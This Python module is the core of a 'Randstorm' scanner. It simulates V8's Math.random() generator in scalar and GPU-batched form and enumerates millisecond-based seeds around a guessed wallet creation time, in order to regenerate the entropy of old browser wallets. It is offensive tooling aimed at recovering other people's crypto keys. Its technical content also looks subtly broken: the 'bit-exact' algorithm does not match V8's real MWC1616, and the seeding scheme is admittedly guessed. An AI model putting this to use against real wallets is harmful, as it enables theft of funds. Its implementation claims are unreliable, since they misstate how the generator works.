"""V8 Math.random() simulator — George Marsaglia's MWC1616 carry scheme.

This is the exact PRNG behind the "Randstorm" class of vulnerabilities that
hit BitcoinJS / JSBN-based browser wallets in 2011-2015:

    // V8 (all versions, src/elements.cc -> RandomNumberGenerator::NextDouble)
    uint32_t NextDoubleRandomChunk() {
        seed2_ = (seed2_ << 16) + seed2_;   // a *= 65537   (a mod 2^32)
        seed1_ = 18000 * seed1_ + carry_;   // b = 18000*b + carry
        carry_ = seed1_ >> 32;              // carry = high 32 bits
        seed1_ &= 0xFFFFFFFF;               // b mod 2^32
        return (seed2_ ^ seed1_) & 0x7FFFFFFF;
    }
    double NextDouble() {                   // kSeedGenScale = 0x1p-31f
        return NextDoubleRandomChunk() * 0x1p-31;
    }

JSBN (`SecureRandom.nextBytes` fallback when window.crypto is absent) draws
one byte per call as `Math.floor(Math.random() * 256)` — i.e. the top byte of
each chunk.  BitcoinJS did the same for entropy gathering.  Both are fully
predictable from the two 32-bit internal seeds (state space = 2^64).

The module provides:
  * scalar reference generator (bit-exact with V8),
  * a numpy vectorized batch generator (thousands of independent states at
    once — the "GPU-style SIMD on CPU" scan core; CUDA/cupy is used
    transparently when available),
  * helpers to build 128/160-bit entropy buffers consumed by the BIP-39
    layer and the JSBN-style single-byte stream.
"""
from __future__ import annotations

import struct
from typing import Iterable, List

import numpy as np

M32 = 0xFFFFFFFF
A2 = 65537               # multiplier for seed2 (<<16 + x)
B1 = 18000               # multiplier for seed1
CHUNK_MASK = 0x7FFFFFFF


class V8Random:
    """Scalar, bit-exact model of V8's MWC1616 double generator."""

    __slots__ = ("seed1", "seed2", "carry")

    def __init__(self, seed1: int, seed2: int):
        self.seed1 = seed1 & 0xFFFFFFFF      # b (low word of the pair)
        self.seed2 = seed2 & 0xFFFFFFFF      # a
        self.carry = 0

    def next_chunk(self) -> int:
        s2 = (self.seed2 << 16) + self.seed2                 # exact int math
        s1 = 18000 * self.seed1 + self.carry
        self.carry = s1 >> 32
        self.seed1 = s1 & 0xFFFFFFFF
        self.seed2 = s2 & 0xFFFFFFFF
        return (self.seed2 ^ self.seed1) & 0x7FFFFFFF

    def random(self) -> float:
        """Math.random() equivalent: chunk * 2**-31 in [0,1)."""
        return self.next_chunk() * 2.0 ** -31

    def next_byte(self) -> int:
        """JSBN SecureRandom.nextBytes fallback: floor(random()*256)."""
        return self.next_chunk() >> 23                     # == floor(x*256)

    def next_bytes(self, n: int) -> bytes:
        return bytes(self.next_byte() for _ in range(n))


def jsbn_entropy(n: int, seed1: int, seed2: int) -> bytes:
    """n pseudo-random bytes exactly as JSBN's SecureRandom would produce."""
    return V8Random(seed1, seed2).next_bytes(n)


# --------------------------------------------------------------------- batch
class V8Batch:
    """Vectorized MWC1616 over L independent lanes (uint32 numpy arrays).

    Every lane advances exactly like one scalar V8 generator; results are
    bit-for-bit identical (verified in tests against the scalar class).
    Uses cupy (CUDA) automatically when available and requested.
    """

    def __init__(self, seed1: Iterable[int], seed2: Iterable[int], gpu: bool = False):
        self.mod = self._get_cupy() if gpu else np
        m = self.mod
        self.s1 = m.array(list(seed1), dtype=m.uint32)
        self.s2 = m.array(list(seed2), dtype=m.uint32)
        self.carry = m.zeros_like(self.s1)
        self.M32 = m.uint32(0xFFFFFFFF)
        self.A2 = m.uint32(65537)
        self.B1 = m.uint32(18000)
        self.CHUNK = m.uint32(0x7FFFFFFF)

    @staticmethod
    def _get_cupy():
        try:                                # optional CUDA acceleration
            import cupy                   # type: ignore
            cupy.cuda.Device().id
            return cupy
        except Exception:
            return np                       # graceful CPU fallback

    def step(self):
        """Advance every lane one chunk; returns the 31-bit chunks.

        Exact semantics (matches the scalar V8Random bit-for-bit):
            prod   = 18000*s1_old + carry_old      (uint64, no overflow)
            carry' = prod >> 32 ;  s1' = prod & MASK
            s2'    = (s2<<16)+s2 (mod 2^32)
            chunk  = (s2' ^ s1') & 0x7FFFFFFF
        """
        m = self.mod
        prod = (self.B1.astype(m.uint64) * self.s1.astype(m.uint64)
                + self.carry.astype(m.uint64))
        self.carry = (prod >> 32).astype(m.uint32)
        self.s1 = (prod & self.M32).astype(m.uint32)
        sh16 = m.uint32(16)
        self.s2 = ((self.s2 << sh16) + self.s2).astype(m.uint32)
        return (self.s2 ^ self.s1) & self.CHUNK

    def bytes_stream(self, n_chunks: int) -> "np.ndarray":
        """(lanes, n_chunks) uint8 array of JSBN-style floor(rand*256) bytes."""
        out = np.empty((self.s1.size, n_chunks), dtype=np.uint8)
        for i in range(n_chunks):
            ch = self.step()
            out[:, i] = np.asarray(ch >> 23, dtype=np.uint8) if self.mod is np \
                else np.asarray(self.mod.asnumpy(ch >> 23), dtype=np.uint8)
        return out

    def entropy_rows(self, n_chunks: int) -> "np.ndarray":
        """(lanes, n_chunks*4) uint8 rows: big-endian 32-bit chunk words.

        This is the raw 31/32-bit-per-call entropy stream used to fill a
        BIP-39 buffer when a wallet grabbed `random()` outputs per 4 bytes.
        """
        out = np.empty((self.s1.size, n_chunks, 4), dtype=np.uint8)
        for i in range(n_chunks):
            ch = np.asarray(self.step(), dtype=np.uint32)
            out[:, i, 0] = (ch >> 24) & 0xFF
            out[:, i, 1] = (ch >> 16) & 0xFF
            out[:, i, 2] = (ch >> 8) & 0xFF
            out[:, i, 3] = ch & 0xFF
        return out.reshape(out.shape[0], -1)


# ------------------------------------------------------------------ seeding
def v8_seeds_from_time_ms(t_ms: int) -> tuple[int, int]:
    """Plausible historical seeding: both words derived from wall-clock ms.

    Many 2011-2015 libraries seeded Math.random()'s internal state lazily at
    first use from Date.now()-style values (directly or via simple mixing).
    We expose the canonical mapping plus an offset family so the scanner can
    sweep milliseconds around a guessed creation time.
    """
    s1 = t_ms & 0xFFFFFFFF
    s2 = ((t_ms >> 32) ^ (t_ms * 2654435761)) & 0xFFFFFFFF
    return s1, s2


def enumerate_seed_pairs(time_ranges: Iterable[tuple[int, int]],
                         stride: int = 1) -> Iterable[tuple[int, int, int]]:
    """Yield (t_ms, seed1, seed2) over [start, stop) millisecond ranges."""
    for (a, b) in time_ranges:
        t = a
        while t < b:
            s1, s2 = v8_seeds_from_time_ms(t)
            yield t, s1, s2
            t += stride
